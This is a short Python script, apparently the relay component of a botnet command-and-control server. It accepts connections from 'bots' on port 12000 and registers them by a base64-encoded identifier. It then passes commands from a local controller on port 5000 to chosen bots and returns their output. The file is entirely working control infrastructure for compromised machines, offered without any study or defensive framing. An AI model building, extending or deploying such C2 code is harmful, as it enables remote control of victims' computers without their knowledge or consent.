import socket
import threading
import base64
import re
import json

conn_list={}
def bots_reciver():
    global conn_list
    HOST = ''                 # Symbolic name meaning all available interfaces
    PORT = 12000            # Arbitrary non-privileged port
    global count
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        mac=""
        if conn:
            mac=conn.recv(4098).decode('utf-8')
            if mac:
                test=(base64.b64decode(mac).decode('utf-8'))
                if re.match("^0x",test):
                    if mac in conn_list:
                        pass
                    else:
                        conn_list[mac]=conn
                else:
                    mac=test
                threading.Thread(target=manager,args=(mac,)).start()



def manager(mac):
    H = 'localhost'    # The remote host
    P = 5000               # The same port as used by the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as a:
        a.connect((H,P))
        a.sendall(bytes(mac, 'utf-8'))
        while True:
            work=a.recv(2048).decode('utf-8')
            work=json.loads(work)
            keys=list(work.keys())[0]
            msg=work[keys]
            sendagain=sender(conn_list[keys],msg)
            if sendagain:
                a.sendall(sendagain)
            else:
                a.sendall(b'Dead')

def sender(conn,msg):
    conn.sendall(bytes(msg, 'utf-8'))
    return conn.recv(64000)

bots_reciver()
